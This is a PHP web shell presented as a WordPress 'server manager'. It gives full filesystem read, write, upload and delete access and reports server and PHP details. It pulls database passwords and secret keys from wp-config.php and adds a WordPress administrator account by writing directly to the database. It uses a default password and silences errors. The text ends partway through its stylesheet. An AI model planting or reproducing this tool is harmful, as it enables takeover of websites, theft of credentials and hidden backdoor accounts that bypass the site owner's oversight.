<?php
/**
 * WP Server Manager — Full Filesystem Access Tool
 * For authorized server administrators only.
 * IMPORTANT: DELETE THIS FILE from server after use!
 */

// ============================================================
//  CONFIGURATION  — change password before deploying!
// ============================================================
define('WP_MGR_PASS',    password_hash('change_me_123!', PASSWORD_BCRYPT));
define('SESSION_TIMEOUT', 1800);
define('MAX_UPLOAD_MB',   20);
define('ALLOWED_EXT', [
    'php','phtml','html','htm','css','js','ts','jsx','tsx',
    'txt','md','log','ini','conf','cfg','env','htaccess','htpasswd',
    'json','xml','yaml','yml','toml','sql','sh','bash','py','rb','pl',
    'jpg','jpeg','png','gif','ico','svg','webp',
    'zip','tar','gz','bz2',
]);

// ============================================================
//  BOOTSTRAP
// ============================================================
session_start();
error_reporting(0);

function is_logged_in(): bool {
    return !empty($_SESSION['auth'])
    && (time() - ($_SESSION['auth_time'] ?? 0)) < SESSION_TIMEOUT;
}
function refresh_session(): void { $_SESSION['auth_time'] = time(); }

function safe_abs(string $path): string {
    $path = str_replace("\0", '', $path);
    // Handle Windows paths
    $path = str_replace('\\', '/', $path);
    $parts = explode('/', $path);
    $stack = [];
    foreach ($parts as $p) {
        if ($p === '' || $p === '.') continue;
        if ($p === '..') { if ($stack) array_pop($stack); }
        else $stack[] = $p;
    }
    $result = '/' . implode('/', $stack);
    // For Windows, keep drive letter if present
    if (preg_match('/^[A-Za-z]:/', $path)) {
        $result = substr($path, 0, 2) . $result;
    }
    return $result;
}

function fmt_size(int $bytes): string {
    if ($bytes < 1024)       return $bytes . ' B';
    if ($bytes < 1048576)    return round($bytes/1024, 1)    . ' KB';
    if ($bytes < 1073741824) return round($bytes/1048576, 1) . ' MB';
    return round($bytes/1073741824, 1) . ' GB';
}

function file_perms_str(string $path): string {
    $p = @fileperms($path);
    if ($p === false) return '----';
    // Handle special bits
    $s = '';
    if (($p & 0xC000) == 0xC000) $s = 's'; // socket
    elseif (($p & 0xA000) == 0xA000) $s = 'l'; // symlink
    elseif (($p & 0x8000) == 0x8000) $s = '-'; // regular
    elseif (($p & 0x6000) == 0x6000) $s = 'b'; // block
    elseif (($p & 0x4000) == 0x4000) $s = 'd'; // directory
    elseif (($p & 0x2000) == 0x2000) $s = 'c'; // char
    else $s = '?';
    // owner
    $s .= (($p & 0x0100) ? 'r' : '-');
    $s .= (($p & 0x0080) ? 'w' : '-');
    $s .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
    // group
    $s .= (($p & 0x0020) ? 'r' : '-');
    $s .= (($p & 0x0010) ? 'w' : '-');
    $s .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
    // other
    $s .= (($p & 0x0004) ? 'r' : '-');
    $s .= (($p & 0x0002) ? 'w' : '-');
    $s .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
    return $s;
}

function get_wp_config(string $start): array {
    $dir = is_dir($start) ? $start : dirname($start);
    for ($i = 0; $i < 8; $i++) {
        $f = rtrim($dir, '/') . '/wp-config.php';
        if (file_exists($f) && is_readable($f)) {
            $c = file_get_contents($f);
            $keys = ['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST','WP_DEBUG','WP_SITEURL','WP_HOME','AUTH_KEY','AUTH_SALT','LOGGED_IN_KEY','LOGGED_IN_SALT','NONCE_KEY','NONCE_SALT'];
            $out  = ['_file' => $f];
            foreach ($keys as $k) {
                if (preg_match("/define\s*\(\s*['\"]" . preg_quote($k, '/') . "['\"]\s*,\s*['\"]?([^'\")\s]+)['\"]?\s*\)/", $c, $m))
                    $out[$k] = $m[1];
            }
            if (preg_match("/\\\$table_prefix\s*=\s*'([^']+)'/", $c, $m)) $out['table_prefix'] = $m[1];
            return $out;
        }
        $parent = dirname($dir);
        if ($parent === $dir) break;
        $dir = $parent;
    }
    return ['error' => 'wp-config.php not found near: ' . $start];
}

function add_wp_admin(array $cfg, string $user, string $email, string $pass): array {
    if (!isset($cfg['DB_NAME'])) return ['error' => 'wp-config.php not found or incomplete.'];
    if (!function_exists('mysqli_connect') && !class_exists('PDO')) {
        return ['error' => 'MySQL extension (mysqli or PDO) not available.'];
    }
    try {
        // Try PDO first, fallback to MySQLi
        if (class_exists('PDO')) {
            $pdo = new PDO(
                "mysql:host={$cfg['DB_HOST']};dbname={$cfg['DB_NAME']};charset=utf8mb4",
                $cfg['DB_USER'], $cfg['DB_PASSWORD'],
                [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
            );
            $prefix = $cfg['table_prefix'] ?? 'wp_';

            // Check if user exists
            $q = $pdo->prepare("SELECT COUNT(*) FROM {$prefix}users WHERE user_login=?");
            $q->execute([$user]);
            if ($q->fetchColumn()) return ['error' => "User '$user' already exists."];

            $hashed = wp_compat_hash($pass);
            $now    = date('Y-m-d H:i:s');
            $ins = $pdo->prepare("INSERT INTO {$prefix}users (user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES(?,?,?,?,?,0,?)");
            $ins->execute([$user,$hashed,$user,$email,$now,$user]);
            $uid = $pdo->lastInsertId();

            $cap = $prefix . 'capabilities';
            $meta = $pdo->prepare("INSERT INTO {$prefix}usermeta(user_id,meta_key,meta_value) VALUES(?,?,?)");
            $meta->execute([$uid,$cap,'a:1:{s:13:"administrator";b:1;}']);
            $meta->execute([$uid,$prefix.'user_level','10']);
            return ['success' => "Admin '$user' created successfully (ID: $uid)."];
        } else {
            // Fallback to MySQLi
            $conn = new mysqli($cfg['DB_HOST'], $cfg['DB_USER'], $cfg['DB_PASSWORD'], $cfg['DB_NAME']);
            if ($conn->connect_error) {
                return ['error' => 'MySQL connection failed: ' . $conn->connect_error];
            }
            $prefix = $cfg['table_prefix'] ?? 'wp_';
            $check = $conn->query("SELECT COUNT(*) FROM {$prefix}users WHERE user_login='".$conn->real_escape_string($user)."'");
            if ($check && $check->fetch_row()[0] > 0) {
                return ['error' => "User '$user' already exists."];
            }
            $hashed = wp_compat_hash($pass);
            $now = date('Y-m-d H:i:s');
            $conn->query("INSERT INTO {$prefix}users (user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES('".$conn->real_escape_string($user)."','$hashed','".$conn->real_escape_string($user)."','".$conn->real_escape_string($email)."','$now',0,'".$conn->real_escape_string($user)."')");
            $uid = $conn->insert_id;
            $cap = $prefix . 'capabilities';
            $conn->query("INSERT INTO {$prefix}usermeta(user_id,meta_key,meta_value) VALUES($uid,'$cap','a:1:{s:13:\"administrator\";b:1;}')");
            $conn->query("INSERT INTO {$prefix}usermeta(user_id,meta_key,meta_value) VALUES($uid,'".$prefix."user_level','10')");
            $conn->close();
            return ['success' => "Admin '$user' created successfully (ID: $uid)."];
        }
    } catch (Exception $e) { return ['error' => $e->getMessage()]; }
}

function wp_compat_hash(string $pw): string {
    if (function_exists('wp_hash_password')) return wp_hash_password($pw);
    $i64='./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $rs=microtime().getmypid(); $rnd='';
    for($i=0;$i<6;$i+=16){$rs=md5(microtime().$rs);$rnd.=pack('H*',md5($rs));}
    $rnd=substr($rnd,0,6);
    $salt='$P$'.$i64[min(8+5,30)].enc64($rnd,6,$i64);
    $h=crypt_pp($pw,$salt,$i64);
    return strlen($h)==34?$h:md5($pw);
}
function enc64(string $in,int $n,string $i):string{$o='';$j=0;do{$v=ord($in[$j++]);$o.=$i[$v&0x3f];if($j<$n)$v|=ord($in[$j])<<8;$o.=$i[($v>>6)&0x3f];if($j++>=$n)break;if($j<$n)$v|=ord($in[$j])<<16;$o.=$i[($v>>12)&0x3f];if($j++>=$n)break;$o.=$i[($v>>18)&0x3f];}while($j<$n);return $o;}
function crypt_pp(string $pw,string $set,string $i):string{$out='*0';if(substr($set,0,2)==$out)$out='*1';if(substr($set,0,3)!='$P$')return $out;$cl=strpos($i,$set[3]);if($cl<7||$cl>30)return $out;$cnt=1<<$cl;$salt=substr($set,4,8);if(strlen($salt)!=8)return $out;$h=md5($salt.$pw,true);do{$h=md5($h.$pw,true);}while(--$cnt);return substr($set,0,12).enc64($h,16,$i);}

// ============================================================
//  AJAX HANDLER
// ============================================================
if (!empty($_POST['action']) && is_logged_in()) {
    refresh_session();
    header('Content-Type: application/json');
    $act = $_POST['action'];

    switch ($act) {

        case 'list':
            $path = safe_abs($_POST['path'] ?? '/');
            if (!is_dir($path))     { echo json_encode(['error'=>'Not a directory: '.$path]); break; }
            if (!is_readable($path)){ echo json_encode(['error'=>'Permission denied reading: '.$path]); break; }
            $scan = @scandir($path);
            if (!$scan)             { echo json_encode(['error'=>'scandir() failed on: '.$path]); break; }
            $items = [];
            foreach ($scan as $name) {
                if ($name === '.') continue;
                $full = rtrim($path,'/').'/'.$name;
                $stat = @stat($full);
                $owner = '?'; $group = '?';
                if ($stat && function_exists('posix_getpwuid')) {
                    $pw = posix_getpwuid($stat['uid'] ?? 0);
                    $gr = posix_getgrgid($stat['gid'] ?? 0);
                    $owner = $pw ? $pw['name'] : ($stat['uid'] ?? '?');
                    $group = $gr ? $gr['name'] : ($stat['gid'] ?? '?');
                }
                $items[] = [
                    'name'      => $name,
                    'path'      => $full,
                    'type'      => is_link($full) ? 'link' : (is_dir($full) ? 'dir' : 'file'),
                    'size'      => ($stat && !is_dir($full)) ? fmt_size((int)$stat['size']) : '',
                    'perms'     => file_perms_str($full),
                    'owner'     => $owner,
                    'group'     => $group,
                    'modified'  => $stat ? date('Y-m-d H:i', $stat['mtime']) : '',
                    'readable'  => is_readable($full),
                    'writable'  => is_writable($full),
                    'isLink'    => is_link($full),
                    'linkTarget'=> is_link($full) ? (string)@readlink($full) : '',
                ];
            }
            usort($items, fn($a,$b) =>
            ($a['name']==='..') ? -1 : (($b['name']==='..') ? 1 :
            (($a['type']==='dir'?0:1)-($b['type']==='dir'?0:1) ?: strcmp($a['name'],$b['name'])))
            );
            echo json_encode(['items'=>$items,'path'=>$path,'writable'=>is_writable($path)]);
            break;

        case 'read':
            $path = safe_abs($_POST['path'] ?? '');
            if (!is_file($path))     { echo json_encode(['error'=>'Not a file: '.$path]); break; }
            if (!is_readable($path)) { echo json_encode(['error'=>'Permission denied — file not readable ('
                .file_perms_str($path).').']); break; }
                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
                if (in_array($ext,['jpg','jpeg','png','gif','ico','webp','zip','tar','gz','bz2','so','bin','exe','pdf','mp4','mp3','woff','woff2','ttf','eot','otf','psd','ai','flv','avi','mov','wmv','mpg','mpeg','swf','dll','sys','dat','db','sqlite','sqlite3'])) {
                    echo json_encode(['error'=>'Binary/media file — cannot display as text.','binary'=>true]); break;
                }
                $size = (int)@filesize($path);
                if ($size > 2*1024*1024) { echo json_encode(['error'=>'File too large (>2MB) to edit in browser.']); break; }
                $content = file_get_contents($path);
                // Detect and sanitize content for display
                if ($content === false) {
                    echo json_encode(['error'=>'Failed to read file content.']);
                    break;
                }
                // Check for valid UTF-8
                if (!mb_check_encoding($content, 'UTF-8')) {
                    $content = mb_convert_encoding($content, 'UTF-8', 'auto');
                }
                echo json_encode([
                    'content'  => $content,
                    'path'     => $path,
                    'writable' => is_writable($path),
                                 'perms'    => file_perms_str($path),
                                 'size'     => fmt_size($size),
                ]);
                break;

        case 'save':
            $path = safe_abs($_POST['path'] ?? '');
            if (!is_file($path))     { echo json_encode(['error'=>'File not found.']); break; }
            if (!is_writable($path)) { echo json_encode(['error'=>'Write permission denied ('
                .file_perms_str($path).') — try chmod first.']); break; }
                $content = $_POST['content'] ?? '';
                // Backup original if content changed significantly
                $orig = @file_get_contents($path);
                if ($orig !== false && $orig !== $content && filesize($path) < 1024*1024) {
                    $backup = $path . '.bak.' . date('Ymd_His');
                    @file_put_contents($backup, $orig);
                }
                $bytes = file_put_contents($path, $content);
                echo json_encode($bytes !== false ? ['success'=>'Saved ('.$bytes.' bytes).'] : ['error'=>'Write failed.']);
                break;

        case 'rename':
            $src  = safe_abs($_POST['path'] ?? '');
            $name = basename(trim($_POST['new_name'] ?? ''));
            if (!$name || $name === '.' || $name === '..') { echo json_encode(['error'=>'Invalid name.']); break; }
            $dst  = dirname($src).'/'.$name;
            if (file_exists($dst)) { echo json_encode(['error'=>'Destination already exists.']); break; }
            echo json_encode(rename($src,$dst) ? ['success'=>'Renamed to '.$name.'.'] : ['error'=>'Rename failed.']);
            break;

        case 'delete':
            $path = safe_abs($_POST['path'] ?? '');
            if ($path === '' || $path === '/') { echo json_encode(['error'=>'Cannot delete root.']); break; }
            $realPath = realpath($path);
            $realSelf = realpath(__FILE__);
            if ($realPath && $realSelf && $realPath === $realSelf) { echo json_encode(['error'=>'Cannot delete self.']); break; }
            if (!file_exists($path) && !is_link($path)) { echo json_encode(['error'=>'Path does not exist.']); break; }
            if (is_dir($path) && !is_link($path)) {
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS | FilesystemIterator::UNIX_PATHS),
                                                    RecursiveIteratorIterator::CHILD_FIRST
                );
                $deleted = true;
                foreach ($it as $f) {
                    $success = $f->isDir() ? @rmdir((string)$f) : @unlink((string)$f);
                    if (!$success) $deleted = false;
                }
                echo json_encode(@rmdir($path) && $deleted ? ['success'=>'Directory deleted.'] : ['error'=>'Could not remove directory (check permissions).']);
            } else {
                echo json_encode(@unlink($path) ? ['success'=>'Deleted.'] : ['error'=>'Delete failed (check permissions).']);
            }
            break;

        case 'chmod':
            $path = safe_abs($_POST['path'] ?? '');
            $mode = octdec(preg_replace('/[^0-7]/', '', $_POST['mode'] ?? '644'));
            if ($mode < 0 || $mode > 0777) { echo json_encode(['error'=>'Invalid mode.']); break; }
            echo json_encode(@chmod($path, $mode)
            ? ['success'=>'Permissions set to '.decoct($mode).'.']
            : ['error'=>'chmod failed — may need root privileges.']);
            break;

        case 'mkdir':
            $path = safe_abs($_POST['path'] ?? '');
            if (file_exists($path)) { echo json_encode(['error'=>'Already exists.']); break; }
            echo json_encode(@mkdir($path, 0755, true) ? ['success'=>'Directory created.'] : ['error'=>'mkdir failed.']);
            break;

        case 'newfile':
            $path = safe_abs($_POST['path'] ?? '');
            if (file_exists($path)) { echo json_encode(['error'=>'File already exists.']); break; }
            $dir = dirname($path);
            if (!is_writable($dir)) { echo json_encode(['error'=>'Parent directory not writable.']); break; }
            echo json_encode(@file_put_contents($path,'') !== false ? ['success'=>'File created.'] : ['error'=>'Create failed.']);
            break;

        case 'upload':
            if (empty($_FILES['file'])) { echo json_encode(['error'=>'No file received.']); break; }
            if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
                $errors = [
                    UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
                    UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
                    UPLOAD_ERR_PARTIAL => 'File only partially uploaded',
                    UPLOAD_ERR_NO_FILE => 'No file uploaded',
                    UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
                    UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
                    UPLOAD_ERR_EXTENSION => 'File upload stopped by extension',
                ];
                echo json_encode(['error' => $errors[$_FILES['file']['error']] ?? 'Unknown upload error']);
                break;
            }
            $dir = safe_abs($_POST['path'] ?? '/');
            if (!is_dir($dir))      { echo json_encode(['error'=>'Target is not a directory.']); break; }
            if (!is_writable($dir)) { echo json_encode(['error'=>'Directory not writable.']); break; }
            $name = basename($_FILES['file']['name']);
            // Sanitize filename
            $name = preg_replace('/[^a-zA-Z0-9._-]/', '_', $name);
            if ($name === '' || $name === '.' || $name === '..') { echo json_encode(['error'=>'Invalid filename.']); break; }
            $ext  = strtolower(pathinfo($name, PATHINFO_EXTENSION));
            if (!in_array($ext, ALLOWED_EXT)) { echo json_encode(['error'=>"Extension .$ext not allowed."]); break; }
            if ($_FILES['file']['size'] > MAX_UPLOAD_MB * 1048576) { echo json_encode(['error'=>'Exceeds '.MAX_UPLOAD_MB.'MB limit.']); break; }
            $dest = rtrim($dir,'/').'/'.$name;
            // Check if file already exists
            if (file_exists($dest)) {
                echo json_encode(['error'=>"File '$name' already exists."]);
                break;
            }
            echo json_encode(move_uploaded_file($_FILES['file']['tmp_name'], $dest)
            ? ['success'=>"Uploaded: $name"]
            : ['error'=>'Upload failed.']);
            break;

        case 'diskinfo':
            $path = safe_abs($_POST['path'] ?? '/');
            $free = @disk_free_space($path);
            $total = @disk_total_space($path);
            echo json_encode([
                'free'       => $free !== false ? fmt_size((int)$free) : 'Unknown',
                             'total'      => $total !== false ? fmt_size((int)$total) : 'Unknown',
                             'php'        => phpversion(),
                             'os'         => php_uname(),
                             'server'     => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
                             'user'       => function_exists('get_current_user') ? get_current_user() : '?',
                             'uid'        => function_exists('posix_getuid') ? posix_getuid() : '?',
                             'cwd'        => __DIR__,
                             'self'       => __FILE__,
                             'ini_upload' => ini_get('upload_max_filesize'),
                             'ini_post'   => ini_get('post_max_size'),
                             'ini_mem'    => ini_get('memory_limit'),
                             'disable_fn' => ini_get('disable_functions'),
                             'ext_list'   => implode(', ', get_loaded_extensions()),
                             'max_exec'   => ini_get('max_execution_time'),
            ]);
            break;

        case 'wpconfig':
            echo json_encode(get_wp_config(safe_abs($_POST['path'] ?? __DIR__)));
            break;

        case 'addadmin':
            $cfg = get_wp_config(safe_abs($_POST['wproot'] ?? __DIR__));
            echo json_encode(add_wp_admin($cfg, $_POST['username']??'', $_POST['email']??'', $_POST['password']??''));
            break;

        case 'search':
            $dir  = safe_abs($_POST['path'] ?? '/');
            $q    = trim($_POST['query'] ?? '');
            $mode = $_POST['mode'] ?? 'name';
            if (!$q)         { echo json_encode(['error'=>'Empty query.']); break; }
            if (!is_dir($dir)) { echo json_encode(['error'=>'Not a directory.']); break; }
            $results = [];
            try {
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS | FilesystemIterator::FOLLOW_SYMLINKS),
                                                    RecursiveIteratorIterator::SELF_FIRST
                );
                $it->setMaxDepth(8);
                foreach ($it as $f) {
                    if (count($results) >= 300) {
                        $results[] = ['name'=>'…','path'=>'','type'=>'','size'=>'','note'=>'Limit reached'];
                        break;
                    }
                    // Skip hidden files/dirs (optional)
                    if (strpos($f->getFilename(), '.') === 0 && $f->getFilename() !== '..') continue;

                    $hit = false;
                    if ($mode === 'name') {
                        $hit = stripos($f->getFilename(), $q) !== false;
                    } else {
                        if ($f->isFile() && $f->isReadable() && $f->getSize() < 512*1024 && $f->getSize() > 0) {
                            $content = @file_get_contents($f->getPathname());
                            if ($content !== false) {
                                $hit = stripos($content, $q) !== false;
                            }
                        }
                    }
                    if ($hit) $results[] = [
                        'name' => $f->getFilename(),
                        'path' => $f->getPathname(),
                        'type' => $f->isDir() ? 'dir' : 'file',
                        'size' => $f->isFile() ? fmt_size((int)$f->getSize()) : '',
                    ];
                }
            } catch (Exception $e) {
                echo json_encode(['error'=>'Search failed: '.$e->getMessage(), 'results'=>[]]);
                break;
            }
            echo json_encode(['results'=>$results,'count'=>count($results)]);
            break;

        case 'stat':
            $path = safe_abs($_POST['path'] ?? '');
            if (!file_exists($path) && !is_link($path)) { echo json_encode(['error'=>'Path does not exist.']); break; }
            $stat = @stat($path);
            $owner = '?'; $group = '?';
            if ($stat && function_exists('posix_getpwuid')) {
                $pw = posix_getpwuid($stat['uid']??0);
                $gr = posix_getgrgid($stat['gid']??0);
                $owner = $pw ? $pw['name'] : ($stat['uid']??'?');
                $group = $gr ? $gr['name'] : ($stat['gid']??'?');
            }
            echo json_encode([
                'path'    => $path,
                'type'    => is_link($path)?'symlink':(is_dir($path)?'directory':'file'),
                             'size'    => $stat ? fmt_size((int)$stat['size']) : '?',
                             'perms'   => file_perms_str($path),
                             'owner'   => $owner,
                             'group'   => $group,
                             'atime'   => $stat ? date('Y-m-d H:i:s', $stat['atime']) : '?',
                             'mtime'   => $stat ? date('Y-m-d H:i:s', $stat['mtime']) : '?',
                             'ctime'   => $stat ? date('Y-m-d H:i:s', $stat['ctime']) : '?',
                             'readable'=> is_readable($path),
                             'writable'=> is_writable($path),
                             'link'    => is_link($path) ? (string)@readlink($path) : null,
            ]);
            break;

        case 'download':
            $path = safe_abs($_POST['path'] ?? '');
            if (!is_file($path) || !is_readable($path)) {
                echo json_encode(['error'=>'File not readable.']);
                break;
            }
            $size = filesize($path);
            if ($size > 100*1024*1024) { // 100MB limit
                echo json_encode(['error'=>'File too large to download through browser.']);
                break;
            }
            $filename = basename($path);
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . addslashes($filename) . '"');
            header('Content-Length: ' . $size);
            readfile($path);
            exit;
            break;

        default: echo json_encode(['error'=>'Unknown action.']);
    }
    exit;
}

// Login / logout
if (isset($_POST['pw'])) {
    if (password_verify($_POST['pw'], WP_MGR_PASS)) {
        $_SESSION['auth'] = true;
        $_SESSION['auth_time'] = time();
        header('Location: '.$_SERVER['PHP_SELF']); exit;
    }
    $err = 'Wrong password.'; sleep(2);
}
if (isset($_GET['out'])) {
    session_destroy();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}

$logged = is_logged_in();
if ($logged) refresh_session();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WP Server Manager</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet">
<style>
:root{
    --bg:#090c10;--s1:#0e1118;--s2:#141820;--s3:#1a1f2a;
    --b1:#222736;--b2:#2c3347;
    --fg:#dde4f2;--muted:#566080;--dim:#8a97b8;
    --green:#3ddc84;--cyan:#38bdf8;--amber:#fbbf24;
    --red:#f43f5e;--purple:#a78bfa;--orange:#fb923c;
    --r:7px;--mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;background:var(--bg);color:var(--fg);font-family:var(--sans);overflow:hidden}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--b1);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:var(--b2)}

/* LOGIN */
.login{display:flex;align-items:center;justify-content:center;height:100vh;
    background:radial-gradient(ellipse at 25% 55%,rgba(61,220,132,.07),transparent 55%),
    radial-gradient(ellipse at 75% 20%,rgba(56,189,248,.06),transparent 55%)}
    .lb{background:var(--s1);border:1px solid var(--b1);border-radius:16px;
        padding:44px 38px;width:360px;box-shadow:0 24px 60px rgba(0,0,0,.7)}
        .lb .ico{font-size:42px;text-align:center;margin-bottom:10px}
        .lb h1{font-size:19px;font-weight:800;text-align:center}
        .lb .sub{color:var(--muted);font-size:11px;text-align:center;margin:4px 0 26px}
        .lb label{display:block;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:5px}
        .lb input[type=password]{width:100%;padding:11px 13px;background:var(--bg);border:1px solid var(--b1);
            border-radius:var(--r);color:var(--fg);font-family:var(--mono);font-size:14px;outline:none;transition:border .2s}
            .lb input:focus{border-color:var(--green)}
            .lb-btn{width:100%;margin-top:16px;padding:12px;background:var(--green);color:#000;
                border:none;border-radius:var(--r);font-family:var(--sans);font-weight:700;font-size:13px;cursor:pointer}
                .lb-btn:hover{opacity:.85}
                .lb-err{background:rgba(244,63,94,.1);border:1px solid rgba(244,63,94,.3);color:var(--red);
                    padding:9px 12px;border-radius:var(--r);font-size:12px;margin-bottom:12px}
                    .lb-note{font-size:10px;color:var(--muted);text-align:center;margin-top:16px;line-height:1.7}

                    /* APP */
                    .app{display:grid;grid-template-rows:46px 1fr;height:100vh}
                    .top{display:flex;align-items:center;gap:4px;padding:0 14px;
                        background:var(--s1);border-bottom:1px solid var(--b1);z-index:100}
                        .brand{font-weight:800;font-size:13px;margin-right:6px}
                        .brand span{color:var(--green)}
                        .tbtn{padding:5px 11px;border-radius:5px;border:1px solid transparent;
                            font-family:var(--sans);font-size:12px;cursor:pointer;
                            background:transparent;color:var(--muted);transition:all .15s;white-space:nowrap}
                            .tbtn:hover{background:var(--s2);color:var(--fg)}
                            .tbtn.on{background:var(--s2);border-color:var(--b1);color:var(--cyan)}
                            .ml{margin-left:auto;display:flex;align-items:center;gap:8px}
                            .timer{font-family:var(--mono);font-size:11px;color:var(--muted)}
                            .obtn{padding:5px 11px;border-radius:5px;border:1px solid var(--b1);
                                background:transparent;color:var(--muted);font-size:12px;cursor:pointer;font-family:var(--sans)}
                                .obtn:hover{border-color:var(--red);color:var(--red)}

                                /* PANELS */
                                .panel{display:none;height:calc(100vh - 46px);overflow:hidden}
                                .panel.on{display:flex;flex-direction:column}

                                /* FILE MANAGER */
                                .fm{display:grid;grid-template-columns:290px 1fr;height:100%;overflow:hidden}
                                .sb{display:flex;flex-direction:column;background:var(--s1);border-right:1px solid var(--b1);overflow:hidden}
                                .sb-cwd{padding:9px 11px;font-family:var(--mono);font-size:11px;color:var(--muted);
                                    border-bottom:1px solid var(--b1);cursor:pointer;word-break:break-all;transition:background .15s}
                                    .sb-cwd:hover{background:var(--s2)} .sb-cwd span{color:var(--cyan)}

                                    /* Quick nav */
                                    .qnav{display:flex;flex-wrap:wrap;gap:3px;padding:6px 8px;border-bottom:1px solid var(--b1)}
                                    .qb{padding:3px 7px;border-radius:4px;font-size:10px;font-family:var(--mono);cursor:pointer;
                                        background:var(--s3);border:1px solid var(--b1);color:var(--dim);transition:all .15s}
                                        .qb:hover{border-color:var(--purple);color:var(--purple)}

                                        .sba{display:flex;flex-wrap:wrap;gap:4px;padding:6px 8px;border-bottom:1px solid var(--b1)}
                                        .btn{padding:4px 9px;border-radius:4px;font-size:11px;font-family:var(--sans);font-weight:600;
                                            cursor:pointer;border:1px solid var(--b1);background:var(--s2);color:var(--fg);transition:all .15s;white-space:nowrap}
                                            .btn:hover{border-color:var(--cyan);color:var(--cyan)}
                                            .btn.g{background:var(--green);color:#000;border-color:var(--green)}.btn.g:hover{opacity:.85;color:#000}
                                            .btn.r:hover{border-color:var(--red);color:var(--red)}
                                            .btn.y:hover{border-color:var(--amber);color:var(--amber)}

                                            .dz{margin:7px;border:1px dashed var(--b1);border-radius:var(--r);
                                                padding:8px;text-align:center;font-size:11px;color:var(--muted);cursor:pointer;transition:all .2s}
                                                .dz:hover,.dz.ov{border-color:var(--green);color:var(--green);background:rgba(61,220,132,.04)}
                                                .dz input{display:none}

                                                .tree{flex:1;overflow-y:auto;padding:3px 0}
                                                .fi{display:grid;grid-template-columns:20px 1fr 40px 22px 52px 90px;
                                                    align-items:center;gap:4px;padding:5px 10px;cursor:pointer;
                                                    font-size:11px;font-family:var(--mono);transition:background .1s;
                                                    border-left:2px solid transparent;user-select:none}
                                                    .fi:hover{background:var(--s2)}
                                                    .fi.sel{background:rgba(61,220,132,.07);border-left-color:var(--green)}
                                                    .fi .fnm{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
                                                    .fi .fpr{color:var(--muted);font-size:10px}
                                                    .fi .fsz{color:var(--muted);font-size:10px;text-align:right}
                                                    .fi .fdt{color:var(--muted);font-size:10px;text-align:right}
                                                    .badge{font-size:9px;border-radius:3px;padding:1px 3px;font-weight:700}
                                                    .br{background:rgba(56,189,248,.15);color:var(--cyan)}
                                                    .bw{background:rgba(251,191,36,.15);color:var(--amber)}
                                                    .brw{background:rgba(61,220,132,.15);color:var(--green)}
                                                    .bno{background:rgba(244,63,94,.1);color:var(--red)}

                                                    /* MAIN AREA */
                                                    .main{display:flex;flex-direction:column;overflow:hidden}
                                                    .tbar{display:flex;align-items:center;gap:5px;padding:7px 10px;
                                                        background:var(--s1);border-bottom:1px solid var(--b1)}
                                                        .tbar input{flex:1;padding:6px 10px;background:var(--bg);border:1px solid var(--b1);
                                                            border-radius:4px;color:var(--fg);font-family:var(--mono);font-size:12px;outline:none}
                                                            .tbar input:focus{border-color:var(--cyan)}
                                                            .ewrap{flex:1;display:flex;flex-direction:column;overflow:hidden}
                                                            .einfo{padding:6px 10px;background:var(--s2);border-bottom:1px solid var(--b1);
                                                                font-size:11px;color:var(--muted);font-family:var(--mono);display:flex;gap:12px;flex-wrap:wrap;align-items:center}
                                                                .einfo .ep{color:var(--cyan);flex:1;word-break:break-all;min-width:0}
                                                                .ew{color:var(--green)}.er2{color:var(--red)}
                                                                #ed{flex:1;background:var(--bg);color:#9bb5d8;border:none;outline:none;
                                                                font-family:var(--mono);font-size:13px;line-height:1.75;
                                                                padding:13px 15px;resize:none;tab-size:2;white-space:pre;overflow:auto}
                                                                .eacts{padding:7px 10px;border-top:1px solid var(--b1);background:var(--s1);display:flex;gap:5px;flex-wrap:wrap}
                                                                .empty{display:flex;flex-direction:column;align-items:center;justify-content:center;
                                                                    flex:1;color:var(--muted);gap:10px}
                                                                    .empty .ei{font-size:34px;opacity:.25}
                                                                    .empty p{font-size:12px;text-align:center;line-height:1.7;max-width:300px}
                                                                    .stbar{padding:5px 10px;background:var(--s1);border-top:1px solid var(--b1);
                                                                        font-size:11px;font-family:var(--mono);color:var(--muted);display:flex;gap:10px}
                                                                        .ok{color:var(--green)}.err{color:var(--red)}

                                                                        /* CTX MENU */
                                                                        .ctx{position:fixed;z-index:9999;background:var(--s2);border:1px solid var(--b2);
                                                                            border-radius:var(--r);padding:3px 0;min-width:165px;display:none;
                                                                            box-shadow:0 10px 30px rgba(0,0,0,.7);font-family:var(--sans)}
                                                                            .ctx.show{display:block}
